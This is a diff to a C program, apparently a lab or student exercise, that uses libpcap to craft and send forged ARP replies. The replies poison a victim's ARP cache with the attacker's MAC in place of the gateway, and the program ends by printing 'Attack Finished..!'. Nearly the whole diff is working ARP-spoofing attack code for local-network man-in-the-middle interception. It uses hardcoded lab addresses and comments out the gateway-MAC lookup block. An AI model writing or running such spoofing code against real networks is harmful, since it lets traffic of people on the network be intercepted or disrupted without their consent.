@@ -41,7 +41,7 @@ int main(int argc, char* argv[])
     int i = 0;
     int res;
     struct pcap_pkthdr *header;
-    char* gateway_ip = "192.168.127.2";
+    char* sender_ip = "192.168.127.135";
     u_int32_t gateway;
     const u_char* rev_packet;
     pcap_t *handle;
@@ -53,7 +53,7 @@ int main(int argc, char* argv[])
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 
     if(argc == 1 || argc >4 ){
-        printf("%s [Interface] [Sender IP] [Victim IP]\n",argv[0]);
+        printf("%s [Interface] [Victim IP] [Gateway IP]\n",argv[0]);
         exit(1);
     }
     ////////////////////////////////////
@@ -64,13 +64,13 @@ int main(int argc, char* argv[])
         int i;
         for(i=0; i<6; i++){
 	    packet[6+i] = s.ifr_addr.sa_data[i];	    	
+	    packet[22+i] = s.ifr_addr.sa_data[i];
 	}
     }
-    printf("%s\n", argv[2]);
-    printf("%s\n", argv[3]);
-    sender = inet_addr(argv[2]);
-    target = inet_addr(argv[3]);
-    gateway = inet_addr(gateway_ip);
+   
+    target = inet_addr(argv[2]);
+    gateway = inet_addr(argv[3]);
+    sender = inet_addr(sender_ip);
     ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
     arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
     handle = pcap_open_live(argv[1], BUFSIZ, 0, -1, errbuf);
@@ -98,12 +98,6 @@ int main(int argc, char* argv[])
     ///////////////////////////////////////
     ////////Attacker Mac and IP////////////
     ///////////////////////////////////////
-    packet[22] = 0x00;
-    packet[23] = 0x0c;
-    packet[24] = 0x29;
-    packet[25] = 0xac;
-    packet[26] = 0x4d;
-    packet[27] = 0xee;
 
     for(i=0; i<4; i++){
         packet[28+i] = sender >> i*8;
@@ -127,9 +121,9 @@ int main(int argc, char* argv[])
     ///////////////////////////////////////////////////////
     //////////////////Catch Packet/////////////////////////
     ///////////////////////////////////////////////////////
-
+	pcap_sendpacket(handle, packet, 42);
     while(1){
-        pcap_sendpacket(handle, packet,42);
+ //      pcap_sendpacket(handle, packet,42);
         res=pcap_next_ex(handle, &header, &rev_packet);
 
         if(res == 0){
@@ -149,7 +143,7 @@ int main(int argc, char* argv[])
 
         }
 
-    }
+    }/*
     //////////////////////////////////////////////////////
     ////////////Making Packet to know Gateway's Mac///////
     //////////////////////////////////////////////////////
@@ -186,7 +180,7 @@ int main(int argc, char* argv[])
 	}
 
     }
-
+*/
     ////////////////////////////////////////////////////////////
     /////////////////////Sending Attack Packet//////////////////
     ////////////////////////////////////////////////////////////
@@ -195,10 +189,11 @@ int main(int argc, char* argv[])
         packet[i] = ethernet->Source_Mac[i];
         packet[32+i] = ethernet->Source_Mac[i];
     }
-
-    for(i=0; i<10; i++){
-        pcap_sendpacket(handle, packet,42);
+    for(i=0;i<4; i++){
+        packet[28+i] = gateway >> i*8;
     }
+
+    pcap_sendpacket(handle, packet,42);
     printf("Attack Finished..!\n");
 
     return 0;
